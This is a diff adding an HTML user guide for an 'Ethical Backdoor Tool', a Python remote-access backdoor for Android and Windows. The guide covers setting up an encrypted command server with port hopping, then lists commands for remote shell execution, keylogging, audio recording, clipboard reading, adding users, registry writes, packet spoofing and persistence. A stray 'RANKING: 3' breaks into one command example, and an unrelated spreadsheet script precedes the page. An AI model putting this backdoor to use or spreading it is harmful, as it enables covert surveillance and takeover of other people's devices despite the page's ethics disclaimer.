@@ -1,0 +1,352 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical Backdoor Tool Documentation</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            text-align: center;
+            padding: 20px 0;
+            background: linear-gradient(to right, #4a00e0, #8e2de2);
+            color: white;
+            border-radius: 8px;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 2.5em;
+        }
+        nav {
+            background: #333;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: bold;
+        }
+        nav a:hover {
+            text-decoration: underline;
+        }
+        section {
+            background: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        h2 {
+            color: #4a00e0;
+            border-bottom: 2px solid #8e2de2;
+            padding-bottom: 5px;
+        }
+        h3 {
+            color: #333;
+        }
+        pre {
+            background: #f8f8f8;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Consolas', monospace;
+        }
+        code {
+            background: #f8f8f8;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-family: 'Consolas', monospace;
+        }
+        ul {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        .note {
+            background: #e7f3fe;
+            border-left: 4px solid #2196F3;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            background: #333;
+            color: white;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Ethical Backdoor Tool Documentation</h1>
+        <p>A modular Python-based tool for educational penetration testing and firewall hardening</p>
+    </header>
+    <nav>
+        <a href="#introduction">Introduction</a>
+        <a href="#prerequisites">Prerequisites</a>
+        <a href="#setup">Setup</a>
+        <a href="#running">Running the Scripts</a>
+        <a href="#commands">Commands</a>
+        <a href="#firewall-testing">Firewall Testing</a>
+        <a href="#video-tips">Video Tips</a>
+        <a href="#ethics">Ethics</a>
+        <a href="#troubleshooting">Troubleshooting</a>
+    </nav>
+    <div class="container">
+        <section id="introduction">
+            <h2>Introduction</h2>
+            <p>This documentation provides a step-by-step guide for using the <code>ethical_backdoor.py</code>, <code>server.py</code>, and <code>admin_control.py</code> scripts, along with four modules (<code>system_ops.py</code>, <code>network_ops.py</code>, <code>admin_controls.py</code>, <code>communication.py</code>). These are designed for educational purposes to demonstrate ethical hacking and test firewall hardening on your own Android (via Termux) and Windows devices.</p>
+            <div class="note">
+                <p><strong>Ethical Use Only</strong>: These scripts must only be used on devices you own or have explicit permission to test. Unauthorized use is illegal and unethical.</p>
+            </div>
+        </section>
+
+        <section id="prerequisites">
+            <h2>Prerequisites</h2>
+            <h3>Software</h3>
+            <ul>
+                <li>Python 3.8+ installed on both control and target machines.</li>
+                <li>Termux (Android) installed from F-Droid.</li>
+                <li>OpenSSL for generating SSL certificates.</li>
+            </ul>
+            <h3>Termux Dependencies</h3>
+            <pre>pkg install python libsndfile openssl
+pip install psutil sounddevice numpy scipy pyperclip netifaces scapy</pre>
+            <h3>Windows Dependencies</h3>
+            <pre>pip install psutil sounddevice numpy scipy pyperclip netifaces scapy winreg</pre>
+            <h3>Permissions</h3>
+            <ul>
+                <li>Termux: Grant microphone (<code>termux-microphone-record</code>) and storage (<code>termux-storage-get</code>) permissions.</li>
+                <li>Windows: Run scripts with admin privileges for features like shutdown or registry access.</li>
+                <li>Root (Termux): Optional for commands like <code>shutdown</code>, <code>add_user</code>.</li>
+            </ul>
+            <h3>Network</h3>
+            <p>Ensure control and target devices are on the same network or use port forwarding for public IPs.</p>
+        </section>
+
+        <section id="setup">
+            <h2>Setup Instructions</h2>
+            <h3>Step 1: Generate SSL Certificates</h3>
+            <p>The backdoor uses SSL for encrypted communication. Generate certificates on the control machine:</p>
+            <pre>openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=localhost'</pre>
+            <p>Place <code>server.crt</code> and <code>server.key</code> in the same directory as <code>server.py</code>.</p>
+            <h3>Step 2: Save Scripts and Modules</h3>
+            <ul>
+                <li>Save <code>server.py</code>, <code>admin_control.py</code>, and modules (<code>system_ops.py</code>, <code>network_ops.py</code>, <code>admin_controls.py</code>, <code>communication.py</code>) on the control machine.</li>
+                <li>Save <code>ethical_backdoor.py</code> and all modules on the target machine.</li>
+                <li>Ensure all scripts and modules are in the same directory.</li>
+            </ul>
+            <h3>Step 3: Configure Test Environment</h3>
+            <ul>
+                <li>Set up a firewall on Android (e.g., <code>iptables</code> with root) or Windows (e.g., Windows Defender Firewall).</li>
+                <li>Optionally, configure a test web server (e.g., Apache/Nginx) for web server testing.</li>
+                <li>Use virtual machines or an isolated network to avoid impacting other systems.</li>
+            </ul>
+        </section>
+
+        <section id="running">
+            <h2>Running the Scripts</h2>
+            <h3>Backdoor Server (Control Machine)</h3>
+            <pre>python server.py</pre>
+            <p>Listens on <code>0.0.0.0:4444</code> (or a random port if blocked) with SSL encryption.</p>
+            <h3>Backdoor Client (Target Device)</h3>
+            <pre>python ethical_backdoor.py client <server_ip></pre>
+            <p>Connects to the server with SSL, using dynamic port hopping and reconnection.</p>
+            <h3>Admin Control Interface (Control Machine)</h3>
+            <pre>python admin_control.py</pre>
+            <p>Enter the server IP and port (default 4444). Available actions:</p>
+            <ul>
+                <li><code>list_clients</code>: List connected clients.</li>
+                <li><code>send <client_id> <command></code>: Send a command to a specific client.</li>
+                <li><code>batch <command></code>: Send a command to all clients.</li>
+                <li><code>exit</code>: Quit the interface.</li>
+            </ul>
+            <p>Example: <code>send 192.168.1.100:12345 sysinfo</code></p>
+        </section>
+
+        <section id="commands">
+            <h2>Backdoor Commands</h2>
+            <p>These commands are sent via the admin interface or directly to the server.</p>
+            <ul>
+                <li><strong>sysinfo</strong>: Get system info (OS, CPU, memory, software, etc.).
+                    <pre>send <client_id> sysinfo</pre></li>
+                <li><strong>dir</strong>: List files in the current directory.
+                    <pre>send <client_id> dir</pre></li>
+                <li><strong>download <file></strong>: Download a file (simulated).
+                    <pre>send < RANKING: 3
+client_id> download file.txt</pre></li>
+                <li><strong>upload <file></strong>: Upload a file (simulated).
+                    <pre>send <client_id> upload file.txt</pre></li>
+                <li><strong>delete <file></strong>: Delete a file.
+                    <pre>send <client_id> delete file.txt</pre></li>
+                <li><strong>search <pattern></strong>: Search for files.
+                    <pre>send <client_id> search *.txt</pre></li>
+                <li><strong>record <seconds></strong>: Record audio.
+                    <pre>send <client_id> record 5</pre></li>
+                <li><strong>shell <cmd></strong>: Execute a shell command.
+                    <pre>send <client_id> shell dir  # Windows
+send <client_id> shell ls   # Android</pre></li>
+                <li><strong>processes</strong>: List running processes.
+                    <pre>send <client_id> processes</pre></li>
+                <li><strong>kill <pid></strong>: Terminate a process.
+                    <pre>send <client_id> kill 1234</pre></li>
+                <li><strong>suspend <pid></strong>: Suspend a process.
+                    <pre>send <client_id> suspend 1234</pre></li>
+                <li><strong>network</strong>: Get network info (interfaces, connections, routing).
+                    <pre>send <client_id> network</pre></li>
+                <li><strong>portscan <ip> <port_range></strong>: Stealth scan ports.
+                    <pre>send <client_id> portscan 192.168.1.1 1-100</pre></li>
+                <li><strong>spoof <ip> <count></strong>: Send spoofed TCP packets.
+                    <pre>send <client_id> spoof 192.168.1.1 10</pre></li>
+                <li><strong>shutdown</strong>: Initiate shutdown (requires admin/root).
+                    <pre>send <client_id> shutdown</pre></li>
+                <li><strong>reboot</strong>: Initiate reboot (requires admin/root).
+                    <pre>send <client_id> reboot</pre></li>
+                <li><strong>lock</strong>: Lock the system (Windows only).
+                    <pre>send <client_id> lock</pre></li>
+                <li><strong>users</strong>: List users.
+                    <pre>send <client_id> users</pre></li>
+                <li><strong>add_user <username> <password></strong>: Add a user (requires admin/root).
+                    <pre>send <client_id> add_user testuser pass123</pre></li>
+                <li><strong>del_user <username></strong>: Delete a user (requires admin/root).
+                    <pre>send <client_id> del_user testuser</pre></li>
+                <li><strong>clipboard_get</strong>: Read clipboard content.
+                    <pre>send <client_id> clipboard_get</pre></li>
+                <li><strong>clipboard_set <text></strong>: Set clipboard content.
+                    <pre>send <client_id> clipboard_set Hello</pre></li>
+                <li><strong>keylog <seconds></strong>: Simulate keylogging (fake data).
+                    <pre>send <client_id> keylog 5</pre></li>
+                <li><strong>registry_get <key> <value></strong>: Get Windows registry value.
+                    <pre>send <client_id> registry_get HKEY_CURRENT_USER\Software\Example Key</pre></li>
+                <li><strong>registry_set <key> <value> <data></strong>: Set Windows registry value.
+                    <pre>send <client_id> registry_set HKEY_CURRENT_USER\Software\Example Key Value</pre></li>
+                <li><strong>set_env <var> <value></strong>: Set environment variable.
+                    <pre>send <client_id> set_env PATH /usr/bin</pre></li>
+                <li><strong>persist</strong>: Enable persistence (Windows only, use cautiously).
+                    <pre>send <client_id> persist</pre></li>
+                <li><strong>exit</strong>: Disconnect the client.
+                    <pre>send <client_id> exit</pre></li>
+            </ul>
+        </section>
+
+        <section id="firewall-testing">
+            <h2>Firewall Testing</h2>
+            <p>Use the scripts to test firewall hardening on Android, Windows, or a web server.</p>
+            <h3>Setup</h3>
+            <ul>
+                <li>Android: Configure <code>iptables</code> (requires root).</li>
+                <li>Windows: Use Windows Defender Firewall.</li>
+                <li>Web Server: Set up Apache/Nginx with firewall rules (e.g., <code>ufw</code>).</li>
+            </ul>
+            <h3>Test Scenarios</h3>
+            <ul>
+                <li><strong>Port Blocking</strong>: Block port 4444 and test port hopping.
+                    <pre>send <client_id> portscan 192.168.1.1 1-1000</pre></li>
+                <li><strong>Scan Detection</strong>: Run stealth scans and check IDS alerts.
+                    <pre>send <client_id> portscan 192.168.1.1 1-100</pre></li>
+                <li><strong>Traffic Analysis</strong>: Send spoofed packets to test detection.
+                    <pre>send <client_id> spoof 192.168.1.1 10</pre></li>
+                <li><strong>Persistence</strong>: Test reconnection blocking.
+                    <pre>send <client_id> persist</pre></li>
+                <li><strong>Web Server</strong>: Test HTTP requests and spoofed traffic.
+                    <pre>send <client_id> shell curl http://localhost
+send <client_id> spoof 192.168.1.1 20</pre></li>
+            </ul>
+            <h3>Validation</h3>
+            <ul>
+                <li>Block non-standard ports.</li>
+                <li>Detect scanning with IDS (e.g., Snort).</li>
+                <li>Detect spoofed traffic with DPI.</li>
+                <li>Implement rate limiting for connections.</li>
+            </ul>
+        </section>
+
+        <section id="video-tips">
+            <h2>Educational Video Tips</h2>
+            <p>For if you want to make education purpose video, start by showing how to install Termux and grant necessary permissions to set up the environment. Next, highlight the admin interface for managing clients, which provides a structured way to send commands. Then, demonstrate key commands like <code>sysinfo</code>, <code>portscan</code>, <code>spoof</code>, <code>registry_set</code>, and <code>add_user</code> to showcase the tool’s capabilities. Additionally, show firewall testing using the <code>portscan</code> and <code>spoof</code> commands to evaluate hardening techniques. Finally, explain how to secure systems against these techniques and include a clear disclaimer emphasizing that the tool is for ethical use only on authorized devices.</p>
+        </section>
+
+        <section id="ethics">
+            <h2>Safety and Ethics</h2>
+            <ul>
+                <li><strong>Authorized Use</strong>: Only test on devices you own or have permission to access.</li>
+                <li><strong>Legal Compliance</strong>: Adhere to local laws and ethical hacking standards (e.g., CEH, OSCP).</li>
+                <li><strong>Safeguards</strong>: No persistence by default; simulated keylogging uses fake data.</li>
+                <li><strong>Disclaimer</strong>: Clearly state in your video that this is for educational purposes only.</li>
+            </ul>
+        </section>
+
+        <section id="troubleshooting">
+            <h2>Troubleshooting</h2>
+            <ul>
+                <li><strong>Connection Failed</strong>: Check server IP, port, and firewall settings. Ensure <code>server.crt</code> and <code>server.key</code> are present.</li>
+                <li><strong>Permission Denied</strong>: Run Windows client as admin; grant Termux permissions or use root.</li>
+                <li><strong>Scapy Errors</strong>: Ensure root/admin privileges for <code>spoof</code> command.</li>
+                <li><strong>SSL Issues</strong>: Regenerate certificates if expired or mismatched.</li>
+                <li><strong>Module Not Found</strong>: Ensure all modules are in the same directory as the scripts.</li>
+            </ul>
+        </section>
+    </div>
+    <footer>
+        <p>Created for educational only Team DriodScript, Developed by Developer brother | May 2025</p>
+    </footer>
+</body>
+</html>
